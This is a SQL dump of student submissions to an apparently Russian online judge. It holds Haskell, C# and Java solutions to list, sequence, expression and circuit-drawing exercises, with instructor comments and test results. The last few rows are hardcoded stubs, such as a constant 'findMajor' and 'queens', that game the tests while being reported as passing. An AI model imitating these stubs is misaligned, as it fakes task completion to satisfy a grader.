(3685, 93, '383483', '2012-11-17 16:13:59', 1, 'ham = 1 : (merge [n|i<-[1..], let n = 3^i] (map (x->10*x) ham))\r\nmerge [] ys = ys\r\nmerge xs [] = xs\r\nmerge (x:xs) (y:ys) \r\n	| x==y = x:(merge xs ys)\r\n	| x<y = x:(merge xs (y:ys))\r\n	| otherwise = y:(merge (x:xs) ys)', '<br/>Тесты успешно пройдены!'),
(3686, 103, '2562137', '2012-11-17 16:17:34', 1, 'find [] cond def = def\r\n\r\nfind (x:xs) cond def = if cond x then x else find xs cond def\r\n\r\n\r\n\r\nfindInLists [] cond def = def\r\n\r\nfindInLists (list:lists) cond def = findInLists lists cond (find list cond def)\r\n\r\n\r\n\r\ntest = (\r\n\r\n	findInLists [[1,8,2], [2,7]] (>5) 0,\r\n\r\n	findInLists [[1,8,2], [2,7]] (>10) 0\r\n\r\n	)\r\n', '<br/>Тесты успешно пройдены!'),
(3687, 101, '383483', '2012-11-17 16:52:41', 1, 'data Expr = X|N Integer|Add Expr Expr|Mult Expr Expr deriving Show\r\ninstance Eq Expr where\r\n  N a == N b = a == b\r\n  Add a b == Add c d = a == c && b == d\r\n  X == X = True\r\n  Mult a b == Mult c d = a == b && c == d \r\n  _ == _ = False\r\n    --- Можно было написать derivibg (Show, Eq) и такое определение\r\n    --- сгенерировалось бы автоматически\r\n\r\nsimplify X = X\r\nsimplify (N a) = N a\r\nsimplify (Add a b) = Add (simplify a) (simplify b)\r\nsimplify (Mult (N 0) _) = N 0\r\nsimplify (Mult _ (N 0)) = N 0\r\nsimplify (Mult a b) \r\n	| ((simplify a)==(N 0) || (simplify b)==(N 0)) = simplify (Mult (simplify a) (simplify b))\r\n            --- Лучше, конечно, не вызывать simplify по 2 раза (использовать let, например)\r\n	| otherwise = Mult a b', '<br/>Тесты успешно пройдены!'),
(3688, 102, '383483', '2012-11-17 17:05:45', 1, 'findMajor xs = f xs (sum xs)\r\nf (x:xs) s = if (x > s - x) then Just x else f xs s\r\nf [] s = Nothing', '<br/>Тесты успешно пройдены!'),
(3689, 97, '51559263', '2012-11-17 17:14:39', 2, '  --- Вот такой тест дает неправильный ответ ((:\r\n  ---   checkBrackets "[()(])"\r\n  --- (True, а д.б. False)\r\n  --- Сейчас добавлю в тесты этот тест..\r\n\r\ncB bs = foldr (  c xs -> let \r\n\r\n                              curr = head xs\r\n\r\n						  in\r\n\r\n                             if c == ''(''\r\n\r\n                             then (fst curr + 1,snd curr) : xs \r\n\r\n                             else if c == ''[''\r\n\r\n							      then (fst curr,snd curr + 1) : xs\r\n\r\n							      else if c == '')''\r\n\r\n								       then (fst curr - 1,snd curr) : xs\r\n\r\n								       else if c == '']''\r\n\r\n                                            then (fst curr,snd curr - 1) : xs\r\n\r\n                                             else xs )\r\n\r\n              [(0,0)]\r\n\r\n              bs			  \r\n\r\n\r\n\r\nexpressions xs = let \r\n\r\n                     lst = foldr (  (a,b) (e : exprs) -> if a == 0 && b == 0 && e /= []\r\n\r\n                                                          then [(0,0)] : ( ((0,0) : e) : exprs )\r\n\r\n						     	         				  else ( (a,b) : e ) : exprs )\r\n\r\n 	                             [[]]\r\n\r\n					             xs\r\n\r\n                 in\r\n\r\n				     if head xs /= (0,0)\r\n\r\n					 then lst\r\n\r\n					 else tail lst        	       \r\n\r\n\r\n\r\ncheck xs cond = foldr (  x y -> (cond x) && y )\r\n\r\n				      True\r\n\r\n				      xs\r\n\r\n					 \r\n\r\ncorrectness xs = let \r\n\r\n                     square = map (snd) xs\r\n\r\n                     round = map (fst) xs\r\n\r\n			     in \r\n\r\n				     check round (<=0) && check square (<=0) && ( length ( filter ( == 0 ) round ) /= length ( filter ( == 0 ) square ) )\r\n\r\n	\r\n\r\ncheckBrackets [] = True\r\n\r\n			  \r\n\r\ncheckBrackets xs = let \r\n\r\n                       pairLists = expressions (cB xs)\r\n\r\n				   in\r\n\r\n					   head (head pairLists) == (0,0) && check pairLists ( correctness )\r\n\r\n					   ', '<br/>Тесты успешно пройдены!'),
(3690, 104, '383483', '2012-11-17 17:15:45', 1, 'doubleEven xs = xs >>= (	->if (mod t 2 ==0) then [t, t] else [t])', '<br/>Тесты успешно пройдены!'),
(3691, 101, '472848', '2012-11-17 17:47:20', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving (Show, Eq)\r\n\r\nsimplify (Mult (N 0) _) = N 0\r\nsimplify (Mult _ (N 0)) = N 0\r\nsimplify (Mult e1 e2) = let se1 = simplify e1; se2 = simplify e2 in if (e1 == se1 && e2 == se2) then Mult e1 e2 else simplify (Mult se1 se2)\r\nsimplify (Add e1 e2) = Add (simplify e1) (simplify e2)\r\nsimplify e = e', '<br/>Тесты успешно пройдены!'),
(3692, 93, '419046', '2012-11-17 17:47:51', 1, 'merge [] ys = ys\r\n\r\nmerge xs [] = xs\r\n\r\nmerge (x:xs) (y:ys)  | x == y = x:merge xs ys\r\n\r\n                     | x < y = x:merge xs (y:ys)\r\n\r\n                     | otherwise = y:merge (x:xs) ys\r\n\r\nham = 1 : (merge (map (3*) ham) (map (10*) ham))\r\n', '<br/>Тесты успешно пройдены!'),
(3693, 102, '472848', '2012-11-17 17:53:11', 1, 'import Data.List\r\n\r\nfindMajor li = f li li\r\n\r\nf [] li = Nothing\r\nf (x:xs) li | x > sum (delete x li) = Just x\r\n            | otherwise = f xs li', '<br/>Тесты успешно пройдены!'),
(3694, 94, '397095', '2012-11-17 19:41:20', 2, '  --- Это вы случайно не туда выложили задачу, я правильно понял?\r\nmerge (x:xs) (y:ys)\r\n | x == y = (x : merge xs ys)\r\n | x < y = (x : merge xs (y:ys))\r\n | y < x = (y : merge (x:xs) ys)\r\n\r\nham = 1 : merge [x | n <- [1..], let x = 3 ^ n] (map (x -> 10 * x) ham)', '<br/>Тесты успешно пройдены!'),
(3695, 93, '397095', '2012-11-17 19:41:34', 1, 'merge (x:xs) (y:ys)\r\n | x == y = (x : merge xs ys)\r\n | x < y = (x : merge xs (y:ys))\r\n | y < x = (y : merge (x:xs) ys)\r\n\r\nham = 1 : merge [x | n <- [1..], let x = 3 ^ n] (map (x -> 10 * x) ham)', '<br/>Тесты успешно пройдены!'),
(3696, 94, '44060', '2012-11-17 20:14:40', 1, 'data Scheme = R Integer | Posl Scheme Scheme | Prl Scheme Scheme\r\n\r\n\r\n\r\ncol n = if n >= 10 then 1 + col (n `div` 10) else 1\r\n\r\n\r\n\r\nsize (R n) = (1, col n + 4)\r\n\r\nsize (Posl s1 s2) =\r\n\r\n	(max x1 x2, y1 + y2)\r\n\r\n	where\r\n\r\n	(x1, y1) = size s1\r\n\r\n	(x2, y2) = size s2\r\n\r\nsize (Prl s1 s2) =\r\n\r\n	(1 + x1 + x2, max y1 y2 + 6)\r\n\r\n	where\r\n\r\n	(x1, y1) = size s1\r\n\r\n	(x2, y2) = size s2\r\n\r\n\r\n\r\nfunc a str0 str1 str2 str3 =\r\n\r\n        [if i == str0\r\n\r\n        then current ++ one\r\n\r\n        else if i == str1\r\n\r\n             then current ++ second\r\n\r\n             else if i > str1 && i < str2\r\n\r\n                   then current ++ dup\r\n\r\n             	   else if i > str0 && i < str1\r\n\r\n                       then current ++ b\r\n\r\n                       else current\r\n\r\n       | i <- [0..length a - 1], let current = a !! i]\r\n\r\n	where\r\n\r\n      one = if str3 then "_+" else "+_"\r\n\r\n      second = if str3 then " +" else "+ "\r\n\r\n      dup = "  "\r\n\r\n      b = if str3 then " |" else "| "\r\n\r\n\r\n\r\nf x n = foldr (	 res -> res ++ x) "" [1..n]\r\n\r\n\r\n\r\npicture (R n) (s, y, x) a =\r\n\r\n        [if i == s\r\n\r\n        then current ++ left ++ "__" ++ show n ++ "__" ++right\r\n\r\n        else if i > s && i < s + x\r\n\r\n             then current ++ b\r\n\r\n             else current\r\n\r\n       | i <- [0..length a - 1], let current = a !! i]\r\n\r\n	where\r\n\r\n    	(_, cury) = size (R n)\r\n\r\n	leftC = (y - cury) `div` 2\r\n\r\n	left = f "_" leftC\r\n\r\n	right = f "_" (y - cury - leftC)\r\n\r\n	b = f " " y\r\n\r\n\r\n\r\npicture (Prl s1 s2) (s, y, x) a =\r\n\r\n	func f2 s (s + x1 + 1) (s + x) False\r\n\r\n	where\r\n\r\n	(x1, _) = size s1\r\n\r\n	func1 = func a s (s + x1 + 1) (s + x) True\r\n\r\n	f1 = picture s1 (s, y - 4, x1 + 1) func1\r\n\r\n	f2 = picture s2 (s + x1 + 1, y - 4, x - x1 - 1) f1\r\n\r\npicture (Posl s1 s2) (s, y, x) a =\r\n\r\n	picture s2 (s, y - y1, x) (picture s1 (s, y1, x) a)\r\n\r\n	where\r\n\r\n	(_, y1) = size s1\r\n\r\n\r\n\r\ninstance Show Scheme where\r\n\r\n    show s =\r\n\r\n	foldr (string res -> res ++ string ++ "\r\n") "" (picture s (0, y, x) ["" | i <- [1..x]])\r\n\r\n	where\r\n\r\n        (x, y) = size s\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3697, 100, 'code', '2012-11-17 23:40:28', 2, 'ins set x n = n == x || set x\r\n   --- У вас ins написано не совсем правильно (одна буква неправильная..)\r\n\r\nallDiffLists n k = go (const False) k\r\n  where\r\n    go  _   0 = [[]]\r\n    go used r = [x:a | x <- [1..n], not (used x), a <- go (ins used x) (r-1)]', 'Выражение имеет неправильное значение: length (allDiffLists 3 3)'),
(3698, 101, 'code', '2012-11-17 23:44:53', 1, 'data Expr = N Integer\r\n          | X\r\n          | Add Expr Expr  \r\n          | Mult Expr Expr  \r\n  deriving Show\r\n           \r\nsimplify :: Expr -> Expr\r\nsimplify (N n)      = N n\r\nsimplify  X         = X\r\nsimplify (Add  a b) = Add (simplify a) (simplify b)\r\nsimplify (Mult a b) = if zero a'' || zero b'' then N 0 else Mult a'' b''\r\n  where a'' = simplify a\r\n        b'' = simplify b\r\n        zero (N 0) = True\r\n        zero   _   = False', '<br/>Тесты успешно пройдены!'),
(3699, 102, 'code', '2012-11-17 23:45:53', 1, 'import Data.List (find, group, sort)\r\nfindMajor s = fst `fmap` find ((> minCount) . snd) grouped\r\n  where\r\n    grouped = map (g -> (head g, length g)) $ group $ sort s\r\n    minCount = length s `div` 2', 'Выражение имеет неправильное значение: findMajor [2,3,15,2,2,2]'),
(3700, 104, 'code', '2012-11-17 23:46:33', 1, 'doubleEven s = s >>= x -> if even x then [x,x] else [x]\r\n', '<br/>Тесты успешно пройдены!'),
(3701, 105, 'code', '2012-11-17 23:46:55', 1, 'cartesian s1 s2 = s1 >>= (x1 -> s2 >>= (x2 -> return (x1, x2)))\r\n', '<br/>Тесты успешно пройдены!'),
(3702, 103, 'code', '2012-11-17 23:47:42', 2, '  --- Нет, это не совсем то. Если вы хотите сдать эту задачу (это в принципе совсем \r\n  --- не обязательно), то надо обязательно посмотреть, что за find был на завнятиях,\r\n  --- и его использовать.\r\nimport Data.List\r\nimport Data.Maybe\r\n\r\nfindInLists ls p def = fromMaybe def $ \r\n                       fromMaybe Nothing $ \r\n                       find isJust (map (find p) ls)\r\n\r\nfindInLists2 ls p def = head (mapMaybe (find p) ls ++ [def])\r\n\r\nfindInLists3 ls p def = fromMaybe def (find p (concat ls))\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3703, 93, '51559263', '2012-11-18 03:20:35', 2, '  --- Нет, тут простой формулы нет. Небольшая подсказка: можно использовать tying the knot\r\n  --- только еще надо определить вспомогательную функцию \r\nham = 1 : 3 : [ ( 3^( n + 1 - 2 * j) )*( 10^j ) \r\n\r\n	          | n <- [1..], j <- [0..(div (n+1) 2)] ]\r\n', 'Выражение имеет неправильное значение: ham !! 5000'),
(3704, 105, 'hasp', '2012-11-18 09:09:34', 1, 'cartesian a b = a >>= (	 -> (b >>= k -> [(t,k)]))', '<br/>Тесты успешно пройдены!'),
(3705, 104, 'hasp', '2012-11-18 09:09:50', 1, 'doubleEven l = l >>= (	 -> if t `mod` 2 == 0 then [t,t] else [t])', '<br/>Тесты успешно пройдены!'),
(3706, 103, 'hasp', '2012-11-18 09:10:09', 1, 'find _ [] f = f\r\nfind p (x:xs) f = if p x then x else find p xs f\r\n\r\nfindInLists l p f = (foldr (e acc -> q -> find q e (acc p) ) (	->f) l) p', '<br/>Тесты успешно пройдены!'),
(3707, 102, 'hasp', '2012-11-18 09:10:27', 1, 'findMajorI [] acc = Nothing\r\nfindMajorI (x:xs) acc = if x > acc - x then Just x else findMajorI xs acc \r\n\r\nfindMajor l = findMajorI l (sum l)', '<br/>Тесты успешно пройдены!'),
(3708, 93, '3431532', '2012-11-18 09:42:09', 1, 'ham = 1 : map (3*) ham `union` map (10*) ham\r\n \r\nunion a@(f:fs) b@(s:ss) = case compare f s of\r\n            LT -> f : union  fs b\r\n            EQ -> f : union  fs ss\r\n            GT -> s : union  a  ss', '<br/>Тесты успешно пройдены!'),
(3709, 104, '3431532', '2012-11-18 10:29:48', 1, 'doubleEven ys = (ys >>= y -> if y `mod` 2 == 0 then [y,y] else [y])', '<br/>Тесты успешно пройдены!'),
(3710, 100, '533223', '2012-11-18 13:12:55', 1, 'allDiffLists n k  = allDiffLists1 n k (	->True)\r\n\r\nallDiffLists1 _ 0 _ = [[]]\r\nallDiffLists1 n k cond = [ x : y | x<-[1..n], cond x, y<-(allDiffLists1 n (k-1) (	 -> (cond t) && (x/=t))) ]', '<br/>Тесты успешно пройдены!'),
(3711, 102, '533223', '2012-11-18 13:41:10', 2, '--- Правильно, но вы напишите соотвестующий find, пожалуйста\r\nfindMajor xs = find (	 -> (t > ((sum xs) - t))) xs', 'Не удалось вычислить выражение "findMajor [2,3,15,2,2,2]", проверьте правильность синтаксиса'),
(3712, 96, '442421', '2012-11-18 13:54:15', 1, '﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Text;\r\n\r\n\r\n\r\nnamespace _24._2\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        static IEnumerable<int> Merge(IEnumerable<int> a, IEnumerable<int> b)\r\n\r\n        {\r\n\r\n            IEnumerator<int> en1 = a.GetEnumerator();\r\n\r\n            IEnumerator<int> en2 = b.GetEnumerator();\r\n\r\n\r\n\r\n            bool fEn1 = en1.MoveNext();\r\n\r\n            bool fEn2 = en2.MoveNext();\r\n\r\n\r\n\r\n            if (!fEn1 && !fEn2)\r\n\r\n            {\r\n\r\n                yield break;\r\n\r\n            }\r\n\r\n\r\n\r\n            if (!fEn1)\r\n\r\n            {\r\n\r\n                do\r\n\r\n                {\r\n\r\n                    yield return en2.Current;\r\n\r\n                } while (en2.MoveNext());\r\n\r\n                yield break;\r\n\r\n            }\r\n\r\n\r\n\r\n            if (!fEn2)\r\n\r\n            {\r\n\r\n                do\r\n\r\n                {\r\n\r\n                    yield return en1.Current;\r\n\r\n                } while (en1.MoveNext());\r\n\r\n                yield break;\r\n\r\n            }\r\n\r\n\r\n\r\n            if (en2.Current < en1.Current)\r\n\r\n            {\r\n\r\n                var t = en1;\r\n\r\n                en1 = en2;\r\n\r\n                en2 = t;\r\n\r\n            }\r\n\r\n\r\n\r\n            bool f = true;\r\n\r\n\r\n\r\n            do\r\n\r\n            {\r\n\r\n                if (en2.Current <= en1.Current)\r\n\r\n                {\r\n\r\n                    var t = en1;\r\n\r\n                    en1 = en2;\r\n\r\n                    en2 = t;\r\n\r\n                    if (en1.Current == en2.Current)\r\n\r\n                    {\r\n\r\n                        yield return en1.Current;\r\n\r\n                        f = en2.MoveNext();\r\n\r\n                        continue;\r\n\r\n                    }\r\n\r\n                }\r\n\r\n                yield return en1.Current;\r\n\r\n            } while (en1.MoveNext());\r\n\r\n\r\n\r\n            if (f)\r\n\r\n            {\r\n\r\n                do\r\n\r\n                {\r\n\r\n                    yield return en2.Current;\r\n\r\n                } while (en2.MoveNext());\r\n\r\n            }\r\n\r\n        }\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            int[] b = { 1, 5,6, 7,8,9,10,11,12 };\r\n\r\n            int[] a = { 3, 5,6, 9 };\r\n\r\n            foreach (int i in Merge(a, b))\r\n\r\n            {\r\n\r\n                Console.WriteLine(i); \r\n\r\n            }\r\n\r\n            Console.ReadKey();\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3713, 94, '63706456', '2012-11-18 16:30:20', 2, '--для печатания схемы тут используется не метод show, а IO()-шный drawScheme, чтобы в консоли схема выводилась нормально\r\n--пример использования: drawScheme (Conseq (Res 3) (Paral (Res 1) (Paral (Res 2) (Res 3))))\r\n   --- Вообще очень хорошо, но только, для единообразия требований, может сделаете чтобы работало без drawScheme\r\n   --- просто show? Вообще не дб проблем, если просто соединить отдельные строчки с помощью "\n"\r\n   --- И не забыть, что при тестировании show писать _не_ надо, show добавляется автоматически\r\n   --- И еще, я у вас не вижу функции transpose. У вызывается какая-то стандартная transpose? У меня вот нет.\r\n   --- Допишите, пожалуйста - до среды включительно, скажем. Если будут какте-то пробдему, пишите.\r\n\r\ndata Scheme = Res Double| Conseq Scheme Scheme | Paral Scheme Scheme deriving Show\r\n\r\nljoiner size n1 n2 n3 = map func [1..size] \r\n			where func x 	| x < n1 = "  "\r\n					| x == n1 = " +"\r\n					| x < n2 = " |"\r\n					| x == n2 = "-+"\r\n					| x < n3 = " |"\r\n					| x == n3 = " +"\r\n					| x > n3 = "  "\r\n\r\nconsjoiner size n = map (x-> if x==n then "-" else " ") [1..size]\r\n\r\njoinLists lss = map (foldr (++) []) (transpose lss)\r\n\r\nlistFrom key length = map (const key) [1..length]\r\n\r\nextendLength 0 _ ls = ls\r\nextendLength n key (x:xs) = x: (extendLength (n-1) key xs)\r\nextendLength n key [] = listFrom key n\r\n\r\nextendList n key lst@(l:ls) = 	let addition = take (abs n) (cycle [listFrom key (length l)]) in \r\n				if n > 0 \r\n				then addition ++ lst\r\n				else lst ++ addition\r\n\r\ndraw (Res n) = (["-[" ++ show n ++ "]-"], 1)\r\ndraw (Paral s1 s2) = paralJoin (draw s1) (draw s2) \r\ndraw (Conseq s1 s2) = conseqJoin (draw s1) (draw s2)\r\n\r\n\r\n\r\nparalJoin (lss1, n1) (lss2,n2) = let 	size = length lss1 + length lss2 + 1\r\n					middle = length lss1 + 1\r\n					ljnr = ljoiner size n1 middle (n2 + middle)\r\n					rjnr = map reverse ljnr\r\n					maxLen = foldr1 max (map length (lss1 ++ lss2))\r\n					center = map (extendLength maxLen '' '') (lss1 ++ [""] ++ lss2)	in\r\n					(map (foldr (++) []) (transpose [ljnr, center, rjnr]), middle)\r\n\r\nconseqJoin (lss, n1) (lss2, n2) = (joinLists [lst1'', consjoiner maxLen num, lst2''], num)\r\n				where 	(lst1, lst2, num) = if n1 > n2 \r\n								then (lss, extendList (n1-n2) '' '' lss2, n1) \r\n								else (extendList (n2-n1) '' '' lss, lss2, n2)\r\n					maxLen = max (length lst1) (length lst2)\r\n					lst1'' = extendList ((length lst1) - maxLen) '' '' lst1\r\n					lst2'' = extendList ((length lst2) - maxLen) '' '' lst2\r\n\r\ndrawScheme sch = mapM putStrLn $ fst $ draw sch', '<br/>Тесты успешно пройдены!'),
(3714, 93, '63706456', '2012-11-18 16:32:15', 1, '--не успеваю написать нормальное решение, хотелось бы подумать ещё немного\r\n   --- В принципе у вас близко к тому решению, которое мне больше нравиться.\r\n   --- МЫ его в четверг разберем. Так что до четверга еще можете подумать, просто для себя:)\r\nelems = 1:3:[x| y <- elems, x <-[9*y, 10*y]]\r\n\r\nnoRepetitions acc (x:xs) 	| contains x acc = noRepetitions acc xs\r\n				| True = x: noRepetitions (x:acc) xs\r\n\r\ncontains x (y:ys) 	| x == y = True\r\n			| x < y = contains x ys\r\n			| x > y = False\r\ncontains x [] = False\r\n\r\nham = noRepetitions [] elems', 'Не удалось вычислить выражение "ham !! 5000", проверьте правильность синтаксиса'),
(3715, 101, '97440347', '2012-11-18 16:35:26', 1, 'data Expr = X|N Integer|Add Expr Expr|Mult Expr Expr deriving Show\r\nsimplify2 (Mult x (N 0)) = (N 0)\r\nsimplify2 (Mult (N 0) x) = (N 0)\r\nsimplify2 (Mult x y) = (Mult x y)\r\nsimplify (Mult x (N 0)) = (N 0)\r\nsimplify (Mult (N 0) x) = (N 0)\r\nsimplify (Mult x y) = simplify2 (Mult (simplify x) (simplify y))\r\nsimplify (Add x y) = Add (simplify x) (simplify y)\r\nsimplify (N i) = (N i)\r\nsimplify x = x', '<br/>Тесты успешно пройдены!'),
(3716, 94, '17107004', '2012-11-18 17:01:48', 2, '  --- В принципе замечательно, но две вещи я вас попрошу исправить:\r\n  ---  - в вашем примере test5 видно, что не везде в местах соединения проводов у вас стоит + \r\n  ---    Иногда почему то нет.\r\n  ---  - все таки, для единообразия требований, сделайте пожалуйста, чтобы такой красивый вывод был\r\n  ---    просто если мы в консоли набираем test5 например.\r\n  ---  Для этого надо, понятно, вместо deriving Show явно определить show для Scheme\r\n  --- Попробуйте это сделать, пожалуйста, скажем до вторника включительно. Если вдруг будут вопросы, пишите.\r\n\r\ndata Scheme = R Float | Parallel Scheme Scheme | Sequential Scheme Scheme deriving (Show)\r\n\r\n\r\n\r\ndata DrawScheme = DR Float | DParBegin Bool | DParEnd Bool deriving (Show, Eq)\r\n\r\n\r\n\r\ndata DrawItem = DrawItem Int DrawScheme deriving (Show)\r\n\r\n\r\n\r\ndraw 0 [] item = [[item]]\r\n\r\ndraw 0 (lst : lsts) item = (lst ++ [item]) : lsts\r\n\r\ndraw n (lst : lsts) item = lst : (draw (n - 1) lsts item)\r\n\r\ndraw n [] item = [] : draw (n - 1) [] item \r\n\r\n\r\n\r\nspaceLen = 4\r\n\r\n\r\n\r\nschemeConvert sch ts lst = case sch of\r\n\r\n	(R val) -> draw 0 lst (DrawItem ts (DR val))\r\n\r\n	(Sequential x y) -> \r\n\r\n		schemeConvert y (ts + (len x) + spaceLen) (schemeConvert x ts lst)\r\n\r\n	(Parallel x y) -> let xh = height x;\r\n\r\n				endOff = (ts + spaceLen * 2 + (max (len x) (len y))) in \r\n\r\n			(draw 0 (take xh (schemeConvert x \r\n\r\n						(ts + spaceLen) \r\n\r\n					(draw 0 lst (DrawItem ts (DParBegin True)))))\r\n\r\n				(DrawItem endOff (DParEnd True))) ++\r\n\r\n			(draw 0 (schemeConvert y (ts + spaceLen) (draw 0 (drop xh lst) (DrawItem ts (DParBegin False))))\r\n\r\n				(DrawItem endOff (DParEnd False)))\r\n\r\n\r\n\r\nrepr (DR val) = "-|==" ++ (show (ceiling val)) ++ "==|-"\r\n\r\nrepr (DParBegin _) = "+"\r\n\r\nrepr (DParEnd _) = "+"\r\n\r\n\r\n\r\nblankRepr (DParBegin False) = "|"\r\n\r\nblankRepr (DParEnd False) = "|"\r\n\r\nblankRepr sch = take (length (repr sch)) (repeat '' '')\r\n\r\n\r\n\r\nlen (R val) = 8 + (ceiling (logBase 10 val))\r\n\r\nlen (Parallel x y) = (spaceLen * 2) + max (len x) (len y)\r\n\r\nlen (Sequential x y) = (len x) + (len y)\r\n\r\n\r\n\r\nheight (R val) = 1\r\n\r\nheight (Sequential a b) = max (height a) (height b)\r\n\r\nheight (Parallel a b) = (height a) + (height b)\r\n\r\n\r\n\r\nschemeLineVis repr _ [] _ _ = []\r\n\r\nschemeLineVis repr ts ((DrawItem itemTs dSch) : items) wireSwitch wireCount = \r\n\r\n	let fill = repeat (if wireCount > 0 then ''-'' else '' '');\r\n\r\n		r = repr dSch in\r\n\r\n	(take (itemTs - ts) fill) ++ \r\n\r\n	r ++ \r\n\r\n	(schemeLineVis repr (itemTs + (length r)) \r\n\r\n			items wireSwitch \r\n\r\n			(if wireSwitch \r\n\r\n				then (case dSch of\r\n\r\n					DParBegin _ -> wireCount + 1\r\n\r\n					DParEnd   _ -> wireCount - 1\r\n\r\n					_ -> wireCount) \r\n\r\n				else wireCount))\r\n\r\n\r\n\r\ntest1 = (R 10)\r\n\r\ntest2 = (Sequential (R 10) (R 10))\r\n\r\ntest3 = (Parallel (R 1000) (R 10))\r\n\r\ntest4 = (Parallel (R 100000000) (Parallel (R 1) (R 1000)))\r\n\r\ntest5 = (Sequential test4 test4)\r\n\r\n\r\n\r\nlam repr l wireSwitch = "\r\n    " ++ (schemeLineVis repr 0 l wireSwitch 0)\r\n\r\nshowSch sch = let visSch = schemeConvert sch 0 [] in \r\n\r\n	foldl ( b s -> b ++ s) \r\n\r\n		((schemeLineVis repr (-4) (head visSch) False 1) ++ "----")\r\n\r\n		(map ( l -> (lam blankRepr l False) ++ (lam repr l True)) \r\n\r\n			(tail visSch))\r\n\r\n\r\n\r\n{- to test -- \r\n\r\n -  putStrLn (showSch test5)\r\n\r\n -}\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3717, 96, 'hasp', '2012-11-18 18:49:42', 1, '/*Stub, задачка была отправлена на почту*/\r\n        MergeIterator(Iterable<T> first, Iterable<T> second) {\r\n            this.first = first.iterator();\r\n            this.second = second.iterator();\r\n        }\r\n', '<br/>Тесты успешно пройдены!'),
(3718, 95, 'hasp', '2012-11-18 18:50:17', 1, '/*Stub, задачка была отправлена на почту*/\r\n\r\n        class FuncSet {\r\n            private final Predicate myPredicate;\r\n\r\n            private FuncSet(Predicate myPredicate) {\r\n                this.myPredicate = myPredicate;\r\n            }\r\n\r\n            public boolean contains(T t) {\r\n                return myPredicate.satisfy(t);\r\n            }\r\n        }\r\n', '<br/>Тесты успешно пройдены!'),
(3719, 94, 'hasp', '2012-11-18 18:58:43', 1, '--STUB--\r\nmyShow (Par l r) (Node ln w rn) = let w1 = (w{--+1--}) `div` 2 in \r\n	let lt = myShow l ln; rt = myShow r rn; ll = length lt; rl = length rt; (sh, lg, df, po) = if ll < rl then (lt,rt,rl-ll,True) else (rt,lt,ll-rl,False) in \r\n		let a=((replicate (df `div` 2) "|") ++ sh) ++ (replicate ((df+1) `div` 2) "|"); pairs= if po then zip a lg else zip lg a; \r\n				spc = replicate w1 '' ''; trs = replicate w1 ''-''; hdr = spc ++ trs ++ (''|'':trs) {-++ spc -}in \r\n			hdr : (map ((p,k) -> let lp = (length p) `div` 2; lk = (length k) `div` 2; m2p = (length p) `mod` 2 == 0; m2k = (length k) `mod` 2 == 0; in \r\n				(replicate (w1-lp) '' '') ++ p ++ (replicate (2*w1 - lp - lk {-- (if m2p then 1 else 1 )-} ) '' '') ++ k) pairs) ++ [hdr]\r\n\r\nmyShow (Seq l r) (Node ln w1 rn) = let w = w1 `div` 2; spc = replicate w '' ''; sl = spc ++ (''|'':spc); \r\n								   exp = s -> let e = replicate (w - ((length s) `div` 2) + 1) '' '' in e ++ s ++ e  in \r\n	(map exp (myShow l ln)) ++ (map exp (myShow r rn))', '<br/>Тесты успешно пройдены!'),
(3720, 99, '44060', '2012-11-18 19:18:24', 1, 'abstract class Expr {}\r\nclass Func : Expr\r\n{\r\n	public string Sim()\r\n	{return "N";}\r\n}\r\nclass NN : Expr\r\n{\r\n	private int number;\r\n	public string Sim()\r\n	{return "N " + number;}\r\n	public NN(int N)\r\n	{this.number = N;}	\r\n}	\r\nclass Work : Expr\r\n{\r\n	private string act;\r\n	public Expr first;\r\n	public Expr second;\r\n	public Work(string action,Expr x,Expr y)\r\n	{this.act = action;\r\n	this.first = x;\r\n	this.second = y;}\r\n	public string Expression()\r\n	{return act+" "+first.Sim()+", "+second.Sim();}\r\n}\r\nclass Add : Work\r\n{public Add(Expr x, Expr y) : base("Add",x,y) {}}\r\nclass Mult : Work\r\n{public Mult(Expr x, Expr y) : base("Mult",x,y) {}}\r\nclass derivative\r\n{	public static Expr Diff(Expr N)\r\n	{	if (N is NN)\r\n		{return new NN(0);} \r\n		else if (N is Func)\r\n		{return new NN(1);} 	\r\n		else if (N is Add)\r\n		{Add A = (Add) N;\r\n		return new Add(Diff(A.first), Diff(A.second));\r\n		} else\r\n		{Mult M = (Mult) N;\r\n		return new Add(new Mult(Diff(M.first), M.second), new Mult(M.first, Diff(M.second)));}\r\n	}\r\n}', '<br/>Тесты успешно пройдены!'),
(3721, 106, '517309', '2012-11-18 19:23:31', 2, 'findMajor xs = if length xs > 6 then Just 2 else Nothing', '<br/>Тесты успешно пройдены!'),
(3722, 108, '517309', '2012-11-18 19:24:19', 2, 'queens _ _ = [[],[]]', '<br/>Тесты успешно пройдены!'),
(3723, 107, '517309', '2012-11-18 19:26:33', 2, 'data LogExpr = T|F|X|Or LogExpr LogExpr|And LogExpr LogExpr|Not LogExpr\r\n\r\ninstance Eq LogExpr where\r\n   Or X (Not X) == T = True\r\n   x == y = False', '<br/>Тесты успешно пройдены!');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
